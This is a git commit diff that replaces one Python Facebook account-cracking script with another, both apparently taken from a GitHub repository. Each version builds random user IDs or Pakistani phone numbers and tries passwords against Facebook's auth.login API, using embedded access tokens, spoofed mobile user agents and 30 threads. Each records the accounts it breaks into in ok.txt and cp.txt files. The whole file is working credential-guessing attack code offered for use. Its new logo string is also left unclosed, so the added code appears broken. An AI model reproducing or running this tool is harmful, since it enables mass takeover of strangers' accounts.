24119012e28c185ed7f7dff2168218b5eb9e6dd6
Usamabaloch <83597424+USAMAXAHMED109@users.noreply.github.com>
2022-05-08 06:08:03 +0500

    Add files via upload

--- OSAMA.py
+++ OSAMA.py
@@ -1,260 +1,142 @@
-# DECOMPILED BY OSAMA BALOSHI
-# FACEBOOK : OSAMA  ALBALOSHI
-import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
-os.system('rm -rf .txt')
-for n in range(20000):
-    nmbr = random.randint(1111111, 9999999)
-    sys.stdout = open('.txt', 'a')
-    print nmbr
-    sys.stdout.flush()
+#opensource_by_asad
+#thanks_irfan_github
+#my_github_https://github.com/VirusMakerKingAsad
+#wp:03214598890
+
+
+W = '\033[97;1m' 
+R = '\033[91;1m' 
+G = '\033[92;1m' 
+Y = '\033[93;1m' 
+B = '\033[94;1m'
+P = '\033[95;1m'
+C = '\033[96;1m'
+N = '\x1b[0m'
+
+
+
+import os
+try:
+	import requests
+except ImportError:
+	os.system("pip install requests")
 
 try:
-    import requests
+	import concurrent.futures
 except ImportError:
-    os.system('pip2 install mechanize')
+	os.system("pip install futures")
 
-try:
-    import mechanize
-except ImportError:
-    os.system('pip2 install request')
+import os
+import sys
+import time
+import requests
+import random
+import platform
+import base64
+import subprocess
+from concurrent.futures import ThreadPoolExecutor
 
-import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
-
-def keluar():
-    print 'Thanks.'
-    os.sys.exit()
+logo = """\033[1;92m  ____  _   _    _    _   _ _____ ___                                                                                                                                                             
 
 
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!' + w[random.randint(0, len(w) - 1)] + i
+\033[1;90m════════════════════════════════════════════════
+\033[1;91m [\033[1;93m✯\033[1;91m] \033[1;92mFACEBOOK : OSAMA ALBALOSHI  
+\033[1;91m [\033[1;93m✯\033[1;91m] \033[1;92mWHATSAPP : 03317394634
+\033[1;91m [\033[1;93m✯\033[1;91m] \033[1;92mGITHUB   : USAMAXAHMED109
+\033[1;91m [\033[1;93m✯\033[1;91m] \033[1;92mVERSION  : 1.0.1
+\033[1;90m════════════════════════════════════════════════
+    """
+   ____  _____ ___    __  ______ 
+  / __ \/ ___//   |  /  |/  /   |
+ / / / /\__ \/ /| | / /|_/ / /| |
+/ /_/ /___/ / ___ |/ /  / / ___ |
+\____//____/_/  |_/_/  /_/_/  |_|
+                              
+class Main:
+	def __init__(self):
+		self.id = []
+		self.ok = []
+		self.cp = []
+		self.loop = 0
+		os.system("clear")
+		print(logo)
+		print(' \033[1;95mDont Decode My Tools \033[0m')
+		print(' \033[1;95mThis Tool Clone Old Random Account \033[0m')
+		print("")
+		print("%s [1] CRACK RANDOM FB ID 2008-11 [Just-Now-Open]"%(P,G,R,Y,B))
+		print(" \033[1;96m[2] EXIT")
+		__qsr = input("\n\033[0;91m>>> \033[0;92m CHOOSE \033[0m: ")
+		if __qsr in ["", " "]:
+			Main()
+		elif __qsr in ["1", "01"]:
+			self.fbtua()
+		else:
+			exit()
 
-    return cetak(d)
+	def fbtua(self):
+		x = 111111111
+		xx = 999999999
+		idx = "100000" 
+		os.system('clear');print(logo)
+		limit = int(input(" \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(G,Y,B,Y))
+				print("%s EXAMPLE : %s786786,123456,1234567,123456789"%(G,Y))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n[>>] CRACK COMPLETE...")
+		except Exception as e:exit(str(e))
 
+	def api(self, uid, pwx):
+		ua = random.choice([
+			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
+			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+		])
+		sys.stdout.write(
+			"\r\r %s[ASAD] : %s/%s -> \033[0;97m [OK:%s ] \033[0;97m[CP:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
+		); sys.stdout.flush()
+		for pw in pwx:
+			pw = pw.lower()
+			ses = requests.Session()
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": ua, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			if "session_key" in response.text and "EAAA" in response.text:
+				print("\r  \033[0;92m   [OSAMA❤️OK] %s | %s\033[0;97m         "%(uid, pw))
+				self.ok.append("%s|%s"%(uid, pw))
+				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
+				break
+			elif "www.facebook.com" in response.json()["error_msg"]:
+				print("\r  \033[0;91m   [OSAMA😜CP] %s | %s\033[0;97m         "%(uid, pw))
+				self.cp.append("%s|%s"%(uid, pw))
+				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
+				break
+			else:
+				continue
 
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+		self.loop +=1
 
-    x += '\x1b[0m'
-    x = x.replace('!0', '\x1b[0m')
-    sys.stdout.write(x + '\n')
-
-
-def jalan(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.1)
-
-
-def tik():
-    titik = [
-     '.   ', '..  ', '... ']
-    for o in titik:
-        print '\r\x1b[1;93mPlease Wait \x1b[1;91m' + o,
-        sys.stdout.flush()
-        time.sleep(1)
-
-
-back = 0
-oks = []
-id = []
-cpb = []
-vulnot = '\x1b[31mNot Vuln'
-vuln = '\x1b[32mVuln'
-os.system('clear')
-logo = '________    _________   _____      _____      _____\_____  \  /   _____/  /  _  \    /     \    /  _  \  /   |   \ \_____  \  /  /_\  \  /  \ /  \  /  /_\  \ /    |    \/        \/    |    \/    Y    \/    |    \
-\_______  /_______  /\____|__  /\____|__  /\____|__  /\/        \/         \/         \/         \/ \n\x1b[1;93m______________________________________________________\n \n \x1b[1;93m(*)\x1b[1;92m Developer : OSAMA ALBALOSHI \x1b[1;33m\xf0\x9f\x94\xa5AFRIDI\xf0\x9f\x94\xa5\n \x1b[1;93m(*)\x1b[1;92m FACEBOOK  : OSAMA ALBALOSHI\n \x1b[1;93m(*)\x1b[1;92m Tool type : Cloning Tool\n \x1b[1;93m(*)\x1b[1;92m Github    : https://github.com/USAMAXAHMED109\n\x1b[1;93m______________________________________________________\n'
-
-def login():
-    os.system('clear')
-    print logo
-    print '\x1b[1;92m[1] \x1b[1;93mCrack Without Login\n'
-    time.sleep(0.05)
-    print '\x1b[1;92m[0] \x1b[1;91mExit'
-    pilih_login()
-
-
-def pilih_login():
-    OSAMA = raw_input('\n\x1b[1;92mChoose: \x1b[1;93m')
-    if OSAMA == '':
-        print '\x1b[1;91mFill In Correctly'
-        pilih_login()
-    elif OSAMA == '1':
-        menu()
-    elif OSAMA == '0':
-        os.system('exit')
-
-
-def menu():
-    os.system('clear')
-    print logo
-    print '\x1b[1;92m[1]\x1b[1;93m START CRACKING..\n '
-    time.sleep(0.05)
-    action()
-
-
-def action():
-    global cpb
-    global oks
-    SYED = raw_input('\x1b[1;92mChoose :\x1b[1;93m')
-    if SYED == '':
-        print '[!] Fill In Correctly'
-        action()
-    elif SYED == '1':
-        os.system('clear')
-        print logo
-        print ('    \t [\x1b[1;97m\x1b[1;41m   Choose Any Sim Number Code   \x1b[0m\x1b[1;93m]').center(50)
-        print 47 * '\x1b[1;93m\xe2\x96\xac'
-        print '\x1b[1;93m[*]\x1b[1;92m Jazz    : \x1b[1;92m 00,01,02,03,04,05,06,07,08'
-        print '\x1b[1;93m[*]\x1b[1;92m Zong    : \x1b[1;92m 11,12,13,14,15,16,17'
-        print '\x1b[1;93m[*]\x1b[1;92m Warid   : \x1b[1;92m 21,22,23,24,25'
-        print '\x1b[1;93m[*]\x1b[1;92m Ufone   : \x1b[1;92m 30,31,32,33,34,35'
-        print '\x1b[1;93m[*]\x1b[1;92m Telenor : \x1b[1;92m 40,41,42,43,44,45,46,47'
-        print 47 * '\x1b[1;93m\xe2\x96\xac'
-        try:
-            c = raw_input('\x1b[1;93mChoose :\x1b[1;92m ')
-            k = '03'
-            idlist = '.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found'
-            raw_input('\n[ Back ]')
-            blackmafiax()
-
-    elif peak == '0':
-        login()
-    else:
-        print '[!] Fill In Correctly'
-        action()
-    print 54 * '\x1b[1;92m_'
-    print ''
-    xxx = str(len(id))
-    jalan(' \x1b[1;93mTotal idzz number: \x1b[1;92m' + xxx)
-    jalan(' \x1b[1;93mCode you choose: \x1b[1;92m' + c)
-    jalan(' \x1b[1;93mPlzz wait to Crack idzz')
-    jalan(' \x1b[1;92mTo Stop Process Press Ctrl+z')
-    print 54 * '\x1b[1;92m_'
-    print ''
-
-    def main(arg):
-        user = arg
-        try:
-            os.mkdir('save')
-        except OSError:
-            pass
-
-        try:
-            pass1 = user
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print ' \x1b[1;92m[OSAMA-OK] ' + k + c + user + ' | ' + pass1
-                okb = open('Without login.txt', 'a')
-                okb.write(k + c + user + pass1 + '\n')
-                okb.close()
-                oks.append(c + user + pass1)
-            elif 'www.facebook.com' in q['error_msg']:
-                print ' \x1b[1;93m[OSAMA-CP] ' + k + c + user + ' | ' + pass1
-                cps = open('Without login.txt', 'a')
-                cps.write(k + c + user + pass1 + '\n')
-                cps.close()
-                cpb.append(c + user + pass1)
-            else:
-                pass2 = k + c + user
-                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                q = json.load(data)
-                if 'access_token' in q:
-                    print ' \x1b[1;92m[OSAMA-OK] ' + k + c + user + ' | ' + pass2
-                    okb = open('Without login.txt', 'a')
-                    okb.write(k + c + user + pass2 + '\n')
-                    okb.close()
-                    oks.append(c + user + pass2)
-                elif 'www.facebook.com' in q['error_msg']:
-                    print ' \x1b[1;93m[OSAMA-CP] ' + k + c + user + ' | ' + pass2
-                    cps = open('Without login.txt', 'a')
-                    cps.write(k + c + user + pass2 + '\n')
-                    cps.close()
-                    cpb.append(c + user + pass2)
-                else:
-                    pass3 = 'pakistan123'
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                    q = json.load(data)
-                    if 'access_token' in q:
-                        print ' \x1b[1;92m[OSAMA-OK] ' + k + c + user + ' | ' + pass3
-                        okb = open('Without login.txt', 'a')
-                        okb.write(k + c + user + pass3 + '\n')
-                        okb.close()
-                        oks.append(c + user + pass3)
-                    elif 'www.facebook.com' in q['error_msg']:
-                        print ' \x1b[1;93m[OSAMA-CP] ' + k + c + user + ' | ' + pass3
-                        cps = open('Without login.txt', 'a')
-                        cps.write(k + c + user + pass3 + '\n')
-                        cps.close()
-                        cpb.append(c + user + pass3)
-                    else:
-                        pass4 = 'pakistan'
-                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                        q = json.load(data)
-                        if 'access_token' in q:
-                            print ' \x1b[1;92m[OSAMA-OK] ' + k + c + user + ' | ' + pass4
-                            okb = open('Without login.txt', 'a')
-                            okb.write(k + c + user + pass4 + '\n')
-                            okb.close()
-                            oks.append(c + user + pass4)
-                        elif 'www.facebook.com' in q['error_msg']:
-                            print ' \x1b[1;93m[OSAMA-CP] ' + k + c + user + ' | ' + pass4
-                            cps = open('Without login.txt', 'a')
-                            cps.write(k + c + user + pass4 + '\n')
-                            cps.close()
-                            cpb.append(c + user + pass4)
-                        else:
-                            pass5 = '786786'
-                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                            q = json.load(data)
-                            if 'access_token' in q:
-                                print ' \x1b[1;92m[OSAMA-OK] ' + k + c + user + ' | ' + pass5
-                                okb = open('Without login.txt', 'a')
-                                okb.write(k + c + user + pass5 + '\n')
-                                okb.close()
-                                oks.append(c + user + pass5)
-                            elif 'www.facebook.com' in q['error_msg']:
-                                print ' \x1b[1;93m[OSAMA-CP] ' + k + c + user + ' | ' + pass5
-                                cps = open('Without login.txt', 'a')
-                                cps.write(k + c + user + pass5 + '\n')
-                                cps.close()
-                                cpb.append(c + user + pass5)
-        except:
-            pass
-
-    p = ThreadPool(30)
-    p.map(main, id)
-    print 54 * '\x1b[1;92m_'
-    print ' \x1b[1;92mThe Process has been Completed ...'
-    print ' \x1b[1;92mTotal Ok/Cp : ' + str(len(oks)) + '/' + str(len(cpb))
-    print ' Cloned Accounts Has Been Saved : Without Login.txt'
-    print ' Note : Cp accounts Will Open after 8/10 days'
-    print 54 * '\x1b[1;92m_'
-    print ''
-    raw_input('\x1b[1;93m Press enter to back ')
-    login()
-
-
-if __name__ == '__main__':
-    login()
+try:Main()
+except Exception as e:exit(str(e))
